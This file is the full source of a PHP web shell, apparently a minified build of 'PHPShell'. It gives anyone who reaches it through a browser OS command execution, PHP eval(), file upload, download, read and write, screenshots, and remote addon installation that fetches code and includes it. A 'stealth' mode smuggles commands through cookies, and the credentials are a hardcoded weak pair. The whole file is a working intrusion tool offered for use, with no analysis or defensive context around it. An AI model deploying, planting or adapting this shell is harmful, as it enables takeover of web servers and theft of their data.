<?php
$GLOBALS["phpshell_min"]=true;
$GLOBALS["phpshell_path"] = __FILE__;
$_REQUEST = array_merge($_REQUEST, $_COOKIE);
define('PHPSHELL_EOF_MARK','---EOF');
$GLOBALS['REGISTERED_FUNCTIONS'] = array();
$GLOBALS['PHPSHELL_CONFIG'] = array(
'MOTD' => "",
'PHP_PATH' => '',
'MODE' => 'shell_exec',
'REQUEST_MODE' => 'stealth',
'WIN_PROMPT' => '%cwd%> ',
'NIX_PROMPT' => '%user%@%hostname%:%cwd% #',
'USE_AUTH' => true,
'AUTH_USERNAME' => 'test12345',
'AUTH_PASSWORD' => 'test12345',
'ENV' => array(
'WIN' => array(),
'NIX' => array()
)
);
?>
<?php
$v0=PHPShell::getArgvAssoc();
function alt_auth(){
?>
<form method="<?php echo $GLOBALS['PHPSHELL_CONFIG']['MODE'] == 'post' ? 'post' : 'get';?>">
<input type="password" name="psauth"><input type="submit" value="Enter" />
</form>
<?php
exit;
}
if(@$GLOBALS['PHPSHELL_CONFIG']['USE_AUTH'] && !isset($v0['cmd'])){
if(@$_REQUEST['psauth'] == $GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD']
|| @$_COOKIE['psauth'] == md5($GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD'])){
setcookie('psauth', md5($GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD']),time()+3600);
} else {
if (!isset($_SERVER['PHP_AUTH_USER'])) {
header('WWW-Authenticate: Basic realm="My Realm"');
header('HTTP/1.0 401 Unauthorized');
echo 'Authentication required.';
alt_auth();
exit;
}
if($_SERVER['PHP_AUTH_USER'] != @$GLOBALS['PHPSHELL_CONFIG']['AUTH_USERNAME']
|| $_SERVER['PHP_AUTH_PW'] != @$GLOBALS['PHPSHELL_CONFIG']['AUTH_PASSWORD'])
{
header('WWW-Authenticate: Basic realm="My Realm"');
header('HTTP/1.0 401 Unauthorized');
echo 'Authentication required.';
alt_auth();
exit;
}
}
}
function registerCommand($f,$cmd,$v3=''){
$GLOBALS['REGISTERED_FUNCTIONS'][$cmd] = array('function'=>$f,'help'=>$v3);
}
class PHPShell {
public function __construct(){
@ob_clean();
$v0=$this::getArgvAssoc();
if(isset($v0['cmd'])){
print_r($v0);
print_r($GLOBALS['argv']);
//Appending DIRECTORY_SEPERATOR because a bug in argv.
chdir(realpath($v0['cwd']).DIRECTORY_SEPARATOR);
$this->spawnProcess($v0['cmd'],$v0['handle']);
exit;
}
if(isset($_REQUEST['cwd'])){
chdir($_REQUEST['cwd']);
}
if(isset($_REQUEST['action'])){
switch($_REQUEST['action']){
case 'exec':
$this->v5($_REQUEST['cmd'],@$_REQUEST['mode']);
break;
case 'suggest':
$this->v6($_REQUEST['input']);
break;
default:
echo json_encode(array('error' => 'Unknown action.'));
break;
}
} else {
$v7 = $GLOBALS['__CSS'];
$v8 = $GLOBALS['__JS'];
$v9 = $GLOBALS['PHPSHELL_CONFIG'];
unset($v9['AUTH_USERNAME']);
unset($v9['AUTH_PASSWORD']);
?><!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PHPShell</title>
<script type="text/javascript" src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
var SHELL_INFO = <?php echo json_encode($this->v10());?>;
</script>
<style>
<?php echo @$GLOBALS['__CSS']; ?>
.input {
border:none;
outline-width: 0;
font-family: monospace;
font-size:12px;
padding:0px;
margin:0px;
}
</style>
</head>
<body>
<script type="text/javascript">
<?php   ?>var PHPShell = {};
(function(phpshell){
var input = '';
var history = [];
var inputBuffer = [];
try {
history = JSON.parse(localStorage.getItem('hist')) || [];
} catch(e){}
$.stealth = function(url, data, callback, type){
for(var k in data){
if(data[k] instanceof Array){
data[k].forEach(function(v,i){
document.cookie = k + '['+ i +']=' + encodeURIComponent(v) + ";";
});
} else {
document.cookie = k + '=' + encodeURIComponent(data[k]) + ";";
}
}
setTimeout(function(){
for(var k in data){
if(data[k] instanceof Array){
data[k].forEach(function(v,i){
document.cookie = k + '['+ i +']=;expires=Thu, 01 Jan 1970 00:00:00 UTC;';
});
} else {
console.log(k);
document.cookie = k + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;';
}
}
},0);
return $.get(url, callback, type);
};
function request(data, callback, type){
return $[SHELL_INFO.requestMode || 'post'](window.location.href + "?" + (new Date).getTime(),data,callback,type);
}
var currentHistory = 0;
var $pre = $('<pre>');
$('body > *').each(function(){
$(this).remove();
});
var mode = localStorage.getItem('ps_xmode') || SHELL_INFO.mode || 'exec';
var onCommandListeners = [];
$('body').append($pre);
var $v12 = $('<span class="output"></span>');
$pre.append($v12);
var $v13 = $('<input class="input">');
$pre.append($v13);
$('body').append($('<div class="bg"></div>'));
$v13.focus();
$v13.css('min-width','100px');
var suggestions = [];
var currentSuggestion = 0;
var lastKey = 0;
$('body').keydown(function(e){
inputBuffer.push(e.which);
});
$v13.keydown(function(e){
switch(e.which){
case 9:
if(lastKey != 9){
suggestions = [];
request({
action:'suggest',
cwd:SHELL_INFO.cwd,
input:$v13.val()
}, function(data){
suggestions = data.suggestions;
$v13.val(suggestions[currentSuggestion]);
$v13.css('width',12+($v13.val().length*12));
},"JSON");
currentSuggestion = 0;
} else if(suggestions.length > 0) {
currentSuggestion++;
if(currentSuggestion >= suggestions.length) currentSuggestion = 0;
else $v13.val(suggestions[currentSuggestion]);
$v13.val(suggestions[currentSuggestion]);
$v13.css('width',12+($v13.val().length*12));
}
lastKey = 9;
e.preventDefault();
return false;
break;
case 38:
currentHistory++;
if(currentHistory > history.length){
currentHistory = 0;
$v13.val('');
} else {
$v13.val('');
setTimeout(function(){
$v13.val(history[history.length-currentHistory]);
$v13.css('width',12+($v13.val().length*12));
},50);
}
break;
case 40:
currentHistory--;
if(history < 0){
history = 0;
$v13.val('');
} else
$v13.val(history[history.length-currentHistory]);
break;
case 13:
runStatement();
break;
default: console.log(e.which);
break;
}
lastKey = e.which;
$v13.css('width',12+($v13.val().length*12));
});
function animateCursor(){
$("html, body").stop();
$("html, body").animate({ scrollTop: $(document).height() }, 200);
}
function write(s){
$v12.append(s);
}
function writeln(s){
$v12.append(s+'\n');
}
function writeCmdLine(){
var cwdStr = SHELL_INFO.prompt_style;
var cwdVars = {
cwd : SHELL_INFO.cwd,
hostname : SHELL_INFO.hostname,
user : SHELL_INFO.user
};
$.each(cwdVars,function(i){
cwdStr = cwdStr.replace('%'+i+'%',this);
});
write('\n<span class="cwd">'+cwdStr+'</span>');
}
function runStatement(){
var statement = $v13.val();
if(history[history.length-1] !== statement){
history.push(statement);
localStorage.setItem('hist', JSON.stringify(history));
}
currentHistory = 0;
$v13.val('');
writeln(statement);
if(statement == "clear" || statement == "cls"){
$v12.html('');
writeCmdLine();
return;
}
var stopPropagation = false;
$(onCommandListeners).each(function(){
if(this.call(phpshell,statement) === false){
stopPropagation = true;
return false;
}
});
if(stopPropagation){
return false;
}
var setMode = statement.match(/^xsetmode *([a-z-_]*)/);
if(setMode && setMode.length == 2){
if($.inArray(setMode[1],supportedModes) > -1){
mode = setMode[1];
writeln('PHPShell mode set to '+mode);
localStorage.setItem('ps_xmode', mode);
} else {
writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
+ "\nCurrent mode: "+mode);
}
writeCmdLine();
return;
}
request({action:'exec',cwd:SHELL_INFO.cwd,cmd:statement,mode:mode},function(response){
write(response.html ? response.output : document.createTextNode(response.output));
SHELL_INFO.cwd = response.cwd;
writeCmdLine();
animateCursor();
},"JSON").error(function(r){
write(r.responseText); writeCmdLine();
});
}
phpshell.onCommand = function(callback){
onCommandListeners.push(callback);
};
phpshell.getInputBuffer = function(){
var buf = inputBuffer;
inputBuffer = [];
return buf;
}
phpshell.writeln = writeln;
phpshell.write = write;
phpshell.writeCmdLine = writeCmdLine;
phpshell.request = request;
writeln(SHELL_INFO.motd);
writeCmdLine();
})(PHPShell);
<?php ?>
<?php echo @$GLOBALS['__JS']; ?>
</script>
</body>
</html>
<?php
}
exit;
}
public static function getArgvAssoc(){
global $argv,$argc;
$v14 = array();
for($i=0; $i < $argc; $i++){
$v16 = strpos($argv[$i+1],'-') === 0;
if(strpos($argv[$i],'-') === 0){
$v14[trim($argv[$i],'-')] = (isset($argv[$i+1]) && !$v16)
? $argv[$i+1] : true;
if(!$v16) $i++;
}
}
return $v14;
}
public static function strToArgv($str, $v18=false){
preg_match_all("#\"[^\"]+\"|'[^']+'|[^ ]++#", $str, $v0);
$argv = array();
foreach($v0[0] as $arg){
$argv[] = $v18 ? $arg : str_replace(array('"',"'"), '', $arg);
}
return $argv;
}
private function v5($cmd,$v20="shell_exec"){
$v12 = $this->v21($cmd);
$v22 = true;
if($v12 === null){
$v22 = false;
if($v20=="shell_exec" || !$v20){
$v12 = shell_exec($_REQUEST['cmd'].' 2>&1');
}
}
$v23 = mb_detect_encoding($v12, mb_list_encodings(),true);
if($v23 != 'UTF-8'){
$v12 = iconv($v23, 'UTF-8//TRANSLIT//IGNORE', $v12);
}
echo json_encode(array(
'output' => $v12,
'html' => $v22,
'cwd' => getcwd()
));
exit;
}
private function v6($i){
$v24 = array();
$v13 = self::strToArgv($i);
$cmd = '';
if(count($v13) > 1){
$v25 = $v13[count($v13)-1];
unset($v13[count($v13)-1]);
$cmd = implode(' ',$v13).' ';
} else {
$v25 = $v13[0];
if(preg_match("#[ ]$#", $i)){
$v25 = '';
$cmd = $v13[0].' ';
}
}
foreach(glob($v25.'*') as $f){
//append directory separator on dirs
if(is_dir($f)) $f .= DIRECTORY_SEPARATOR;
if(strpos($f,' ') !== false) $f = '"'.$f.'"';
$v24[] = $cmd.$f;
}
$v24[] = $i;
echo json_encode(array('suggestions'=>$v24));
exit;
}
private function v21($v26){
$v26 = explode(' ', $v26,2);
$cmd = $v26[0];
$v0 = @$v26[1];
if(isset($GLOBALS['REGISTERED_FUNCTIONS'][$cmd])){
ob_start();
$v27 = $GLOBALS['REGISTERED_FUNCTIONS'][$cmd]['function'];
$v27($v0);
return ob_get_clean();
}
return null;
}
private function v10(){
return array(
'cwd' => getcwd(),
'motd' => $this->v28(),
'user' => function_exists('posix_getlogin')
? posix_getlogin()
: (
(function_exists('shell_exec') && PHPShell::isWindows())
? trim(shell_exec('echo %USERNAME%'))
: '?'
),
'mode' => $GLOBALS['PHPSHELL_CONFIG']['MODE'],
'requestMode' => $GLOBALS['PHPSHELL_CONFIG']['REQUEST_MODE'],
'hostname' => function_exists('gethostname') ? gethostname() : 'unknown-host',
'prompt_style' => $GLOBALS['PHPSHELL_CONFIG'][PHPShell::isWindows()?'WIN_PROMPT':'NIX_PROMPT']
);
}
private function v28(){
$v29 = 'PHP-Shell - '.php_uname();
if(isset($GLOBALS['PHPSHELL_CONFIG']['MOTD']))
$v29 .= "\n\n".$GLOBALS['PHPSHELL_CONFIG']['MOTD']."\n";
$v29 .= "\nEnter 'help' to get started.";
return $v29;
}
public static function isWindows(){
return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}
}
?>
<?php
function phpshell_cd($v0){
$v0 = PHPShell::strToArgv($v0);
$v0 = $v0[0];
if(file_exists($v0))
chdir($v0);
elseif(file_exists(getcwd().'/'.$v0))
chdir(getcwd().'/'.$v0);
echo 'Changed directory to: '.getcwd();
}
registerCommand('phpshell_cd','cd','Change directory');
function phpshell_wget($v0){
$v0 = PHPShell::strToArgv($v0);
if(isset($v0[0]) && filter_var($v0[0],FILTER_VALIDATE_URL) !== FALSE){
$v30 = $v0[1] ? $v0[1] : pathinfo($v0[0],PATHINFO_FILENAME);
echo "Downloading: $v0[0]...\n";
file_put_contents($v30, file_get_contents($v0[0]));
echo "Saved download as '$v30'\n";
} else echo "Invalid url\n";
}
registerCommand('phpshell_wget','dl','Download file \'dl source dest\'');
function phpshell_eval($v0){
if(preg_match('#;|echo\b|print[ (]|return#', $v0))
eval($v0);
else
var_dump(eval("return $v0;"));
}
registerCommand('phpshell_eval','eval','PHP eval()');
function phpshell_help($v0){
foreach($GLOBALS['REGISTERED_FUNCTIONS'] as $cmd => $v31){
echo str_pad($cmd, 25);
echo $v31['help'];
echo "\n";
}
}
registerCommand('phpshell_help','help','The command you just called');
function phpshell_lc($v0){
echo count(file($v0));
}
if(PHPShell::isWindows())
registerCommand('phpshell_lc','lc','line count');
function _ls_formatbytes($v32, $v33 = 2) {
$v34 = array('B ', 'KB', 'MB', 'GB', 'TB');
$v32 = max($v32, 0);
$pow = floor(($v32 ? log($v32) : 0) / log(1024));
$pow = min($pow, count($v34) - 1);
$v32 /= pow(1024, $pow);
return round($v32, $v33) . ' ' . $v34[$pow];
}
function phpshell_ls($ls){
foreach(glob($ls ? $ls : '*') as $v37){
echo str_pad(
is_dir($v37)
? '--DIR--'
: _ls_formatbytes(filesize($v37)),10,' ',STR_PAD_LEFT)
. " " . $v37 . "\n";
}
}
if(PHPShell::isWindows())
registerCommand('phpshell_ls','ls','List directory content');
else
registerCommand('phpshell_ls','list','List directory content');
function phpshell_build_util($v0){
$v0 = PHPShell::strToArgv($v0);
print_r($v0);
$v38 = in_array('--replace', $v0);
$v39 = in_array('--keep', $v0);
$gz = in_array('--gz', $v0);
$v41 = array();
$v42 = in_array('without', $v0);
$v43 = in_array('with', $v0);
$v44 = false;
foreach($v0 as $a){
if(preg_match("#^--dest=(.+)#", $a, $m)){
$v44 = $m[1];
}
}
if($v38 && $GLOBALS['phpshell_min']){
$v44 = $GLOBALS['phpshell_path'];
}
if(count($v0) < 2 || !($v39 || $v44)){
echo "\nYou must at least specify all addons or include / exclude and either --keep, --replace or --dest. --replace and --dest will only keep gz comp if it can";
echo "\nExamples: ";
echo "\nqbuild rebuild with cd ls qedit qget qput qpk --replace #Replace current phpshell with light custom version";
echo "\nqbuild rebuild without qpk screenprint txttoart --keep #Keep build folder and build a semi bloated version without qpk, screenprint and txttoart";
echo "\nqbuild rebuild all --dest=/move/build/here #build with all addons and move build files to dest";
exit;
}
$v47 = "build_phpshell/php-shell-master";
$v48 = "$v47/addons";
copy('https://github.com/EJTH/php-shell/archive/master.zip','phpshell_master.zip');
_unzip('phpshell_master.zip', 'build_phpshell/');
if(file_exists('build_phpshell/')){
echo "\nBuilding...\n";
foreach(glob("$v48/*.php") as $a){
$a = pathinfo($a, PATHINFO_FILENAME);
$v49 = in_array($a, $v0);
if(($v42 && $v49) || ($v43 && !$v49)){
unlink("$v48/$a.php");
} else {
$v41[] = $a;
}
}
if(in_array('all', $v0)) $v41 = "all";
echo "Building with addons: " . implode(", ",$v41);
file_put_contents("$v47/phpshell-config.php",'<?php $GLOBALS[\'PHPSHELL_CONFIG\'] = json_decode(\'' . json_encode($GLOBALS['PHPSHELL_CONFIG']) . '\',true);?>');
passthru("cd $v47/ && rm -f phpshell-min.php phpshell-min-gz.php && php phpshell-build.php");
echo "\nSuccesfully build\n";
if($v44){
echo $v44;
if(!$gz){
copy("$v47/phpshell-min.php", $v44);
unlink("$v47/phpshell-min.php");
} else {
copy("$v47/phpshell-min-gz.php", $v44);
unlink("$v47/phpshell-min-gz.php");
}
}
if(!$v39){
echo "removing build dir";
passthru("rm -rf build_phpshell");
}
unlink('phpshell_master.zip');
}
}
function _unzip($s,$d){
$zip = new ZipArchive;
$res = $zip->open($s);
if ($res === TRUE) {
$zip->extractTo($d);
$zip->close();
return true;
}
}
registerCommand('phpshell_build_util','qbuild','Rebuild with addons');
?>
<?php   
function phpshell_qedit($v0){
echo '<div class="qedit" data-file="'.htmlentities($v0).'"><textarea>'.@str_replace(['<','>'],['&lt;','&gt;'],file_get_contents(realpath($v0))).'</textarea><button class="save">Save</button></div>';
}
if(isset($_REQUEST['qedit_content']) && isset($_REQUEST['qedit_fn'])){
echo file_put_contents($_REQUEST['qedit_fn'],$_REQUEST['qedit_content']);
exit;
}
registerCommand('phpshell_qedit','qedit','Edit various data files. supported: txt');
?>
<?php   
$v57 = pathinfo($GLOBALS['phpshell_path'], PATHINFO_DIRNAME) . '/phpshell_addons/';
foreach(glob("$v57/*.php") as $a){
include_once $a;
}
function phpshell_qpk($v0){
$v0 = PHPShell::strToArgv($v0);
switch($v0[0]){
case 'install':
$v58 = $v0[1];
$v57 = pathinfo($GLOBALS['phpshell_path'], PATHINFO_DIRNAME) . '/phpshell_addons/';
$v59 = "https://raw.githubusercontent.com/EJTH/php-shell/master/addons/$v58.php";
if(!file_exists($v57)) mkdir($v57);
if(file_exists($v57)){
error_reporting(E_ALL);
if( copy($v59,$v57 . $v0[1] . '.php') ){
echo "Installed $v59";
} else {
echo "Failed to install $v59";
}
} else {
echo "No addon folder found. Please create writeable directory at $v57";
}
break;
case 'list':
$v60 = explode("\n",file_get_contents("https://raw.githubusercontent.com/EJTH/php-shell/master/qpk_list"));
foreach($v60 as $a){
if(strpos($a, $v0[1]) !== false || empty($v0[1])){
echo "\n$a";
}
}
break;
default:
echo "list | install | remove";
break;
}
}
registerCommand('phpshell_qpk','qpk','Manage addons (list | install | remove)');
?>
<?php   
function phpshell_qput($v0){
echo '<iframe src="?qputfrm=1&cwd='. urlencode($_POST['cwd']) .'"><iframe>';
}
function phpshell_qput_frm(){
echo '<form method="post" enctype="multipart/form-data"><input type="hidden" name="cwd" value"'.htmlentities($_GET['cwd']).'" /><input onchange="this.parentNode.submit();" type="file" name="qput" /></form>';
}
if(isset($v61['qput'])){
move_uploaded_file($v61['qput']['tmp_name'], $v61['qput']['name']);
}
if(isset($_GET['qputfrm'])){
phpshell_qput_frm();
exit;
}
registerCommand('phpshell_qput','qput','Put file(s)');
?>
<?php   
function phpshell_qwget($v0){
$v0 = PHPShell::strToArgv($v0);
if(count($v0) == 0){
echo "Usage: qwget URL [FILE]";
} else {
$v62 = fopen($v0[0], "r");
$fn = isset($v0[1]) ? $v0[1]
: pathinfo($v0[1], PATHINFO_BASENAME);
$v64 = fopen($fn, 'w');
if($v62 === FALSE) echo "Failed to get url: " + $v0[0];
if($v64 === FALSE) echo "Failed to get create file: " + $v0[1];
while (!feof($v62)) {
echo ".";
fwrite($v64, fread($v62, 512));
}
echo "Downloaded file to: $fn";
fclose($v64);
}
}
if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
}
registerCommand('phpshell_qwget','qwget','When you need curl or wget, but neither are there.');
?>
<?php
function phpshell_prntscrn($v0){
echo '<img src="?printscreen='.time().'" alt="[LOADING SCREENSHOT]" style="max-width:80%" />';
}
if(isset($_GET['printscreen'])){
$im = imagegrabscreen();
imagepng($im);
}
if(PHPShell::isWindows())
registerCommand('phpshell_prntscrn','prntscrn','Print screenshot to shell');
function phpshell_tail($v0){
$v66 = file($v0);
if(!$v66){
echo 'Could not open file:'.$v0;
return;
}
$v67 = array();
$lc = 25;
if(preg_match("#-n ([0-9]+)#", $v0, $v67)){
$lc = $v67[1];
}
$v69 = count($v66);
for($i=max($v69-$lc,0);$i<$v69;$i++){
echo str_pad($i+1,5).htmlentities($v66[$i]);
}
}
if(PHPShell::isWindows())
registerCommand('phpshell_tail','tail','Get last lines from file (-n [lc])');
function phpshell_txt2art($i,$ret=false){
$v0 = PHPShell::strToArgv($i);
$str = utf8_decode($v0[0]);
$v71 = @$v0[1] ? $v0[1] : 5;
$imW = strlen($str)* imagefontwidth($v71);
$imH = imagefontheight($v71);
$im = imagecreate($imW,$imH);
$bg = imagecolorallocate($im, 255, 255, 255);
$v75 = imagecolorallocate($im, 0, 0, 0);
$v76 = @$v0[2] ? $v0[2] : '#';
$v77 = @$v0[3] ? $v0[3] : ' ';
imagestring($im, $v71, 0, 0, $str, $v75);
$out = '';
for($y = 0; $y<$imH; $y++){
for($x = 0; $x < $imW; $x++){
$out .= (imagecolorat($im, $x, $y) == $v75) ? $v76: $v77;
}
$out .= "\n";
}
echo $out;
if($ret)return $out;
if(file_put_contents('txt2art.out',$out)){
echo "\nSaved to: txt2art.out";
}
}
registerCommand('phpshell_txt2art','txt2art','String to "ascii-art"');
function phpshell_view($v0){
if(file_exists($v0)){
$ext = pathinfo($v0,PATHINFO_EXTENSION);
switch($ext){
case 'jpg':
case 'jpeg':
case 'png':
case 'bmp':
case 'gif':
$v31 = getimagesize($v0);
echo '<img src="?view_img='.urlencode(realpath($v0)).'" style="max-width:80%" />';
echo "\n$v31[mime] ($v31[0] x $v31[1])";
break;
default:
$v82 = file($v0);
foreach($v82 as $l => $s){
echo str_pad($l+1,8).htmlentities($s);
}
break;
}
}
}
if(isset($_GET['view_img'])){
echo file_get_contents($_GET['view_img']);
}
registerCommand('phpshell_view','view','View various data files. supported: jpeg, png, bmp, gif, txt, php');
function tmp(){
return tempnam(sys_get_temp_dir(),'xpc');
}
function xproc_list_clean($s){
return str_replace(sys_get_temp_dir().'/xout','', $s);
}
function xproc_open($id, $cmd){
file_put_contents(sys_get_temp_dir().'/xin'.$id,'');
$v85 = array(
0 => array("file", sys_get_temp_dir().'/xin'.$id, "r") ,
1 => array("file", sys_get_temp_dir().'/xout'.$id, "a") ,
2 => array("file", sys_get_temp_dir().'/xerr'.$id, "a")
);
Proc_close(Proc_Open ($cmd.'&', $v85, $v86, 'tmp/'));
}
if(isset($_REQUEST['xproc'])){
switch($_REQUEST['xproc']){
case 'start':
$cmd = explode(' ',$_REQUEST['cmd'],2)[1];
$id = md5(microtime().$cmd);
echo $id;
xproc_open($id, $cmd);
break;
case 'poll':
$id = $_REQUEST['id'];
echo file_get_contents(sys_get_temp_dir().'/xout'.$id);
echo file_get_contents(sys_get_temp_dir().'/xerr'.$id);
file_put_contents(sys_get_temp_dir().'/xout'.$id,'');
file_put_contents(sys_get_temp_dir().'/xerr'.$id,'');
$v13 ="";
foreach($_REQUEST['input'] as $i){
$v13 .= chr($i);
}
if($v13){
file_put_contents(sys_get_temp_dir().'/xin'.$id,$v13,FILE_APPEND);
}
break;
case 'list':
echo implode("\n",array_map('xproc_list_clean',glob(sys_get_temp_dir().'/xout*')));
break;
}
exit();
}
?>
<?php
$GLOBALS['__JS'] = <<<JSHERE
\$(function(){
PHPShell.onCommand(function(statement){
if(statement.match(/^help/)){
\$([
'Client commands:',
'xsetmode shell_exec | interactive',
'xecho on | off',
'help',
'',
'PHP commands:'
]).each(function(){
PHPShell.writeln(this);
});
}
});
})
\$(function(){
\$(document).on('click','.qedit .save', function(e){
var \$v87 = \$(this.parentNode);
\$.post(window.location.href,{
qedit_content : \$v87.find('textarea').val(),
qedit_fn : \$v87.data('file')
}, function(){
\$v87.replaceWith('Saved');
});
});
})
var XProc = function(instanceId){
var pollInterval;
function poll(){
PHPShell.request({
xproc: 'poll',
id: instanceId,
input: PHPShell.getInputBuffer()
}, function(output){
PHPShell.write(output);
}, "text");
}
pollInterval = setInterval(poll, 1000);
poll();
return {
stop: function(){
clearInterval(pollInterval);
},
poll: function(ms){
pollInterval = setInterval(poll, ms);
}
}
};
function resumeProc(instanceId){
if(instanceId){
var proc = new XProc(instanceId);
PHPShell.writeln("Successfully started command. CTRL+D to send to background. Use 'xscreen " + instanceId + "' to bring the instance to the foreground.");
var keyhandler = function(e){
if(e.ctrlKey && e.keyCode == 68){
console.log('STOP');
proc.stop();
\$('body').off('keydown',keyhandler);
PHPShell.writeCmdLine();
return false;
}
};
\$('body').on('keydown',keyhandler);
} else {
PHPShell.writeCmdLine();
}
}
PHPShell.onCommand(function(cmdline){
if(cmdline.split(' ')[0] === 'xrun'){
PHPShell.request({
xproc : 'start',
cmd : cmdline
}, function(instanceId){
resumeProc(instanceId);
});
return false;
}
var cmd = cmdline.split(' ');
if(cmd[0] === 'xscreen'){
if(cmd[1] === 'list'){
PHPShell.request({
xproc : 'list',
}, function(list){
PHPShell.writeln("\\n"+list);
PHPShell.writeCmdLine();
});
} else {
resumeProc(cmd[1]);
}
return false;
}
});
JSHERE;
$GLOBALS['__CSS'] = <<<CSSHERE
.cwd {
color: red;
}
body,.input {
text-shadow: 2px 2px #000;
color:#eee;
}
html,body {
margin:0px;
padding:0px;
}
.qedit {
}
.qedit textarea {
display:block;
width: 90%;
min-height: 300px;
opacity: 0.2;
}
.bg {
background: #45484d;
background: -moz-linear-gradient(top, #45484d 0%, #000000 100%);
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#45484d), color-stop(100%,#000000));
background: -webkit-linear-gradient(top, #45484d 0%,#000000 100%);
background: -o-linear-gradient(top, #45484d 0%,#000000 100%);
background: -ms-linear-gradient(top, #45484d 0%,#000000 100%);
background: linear-gradient(to bottom, #45484d 0%,#000000 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#45484d', endColorstr='#000000',GradientType=0 );
position:fixed;
width:100%;
height:100%;
top:0px;
z-index:1;
}
pre {
z-index:2;
position:relative;
padding:16px;
}
.input {
background:transparent;
}
a {
color:#fff;
}
CSSHERE;
$GLOBALS['phpshell'] = new PHPShell(); ?>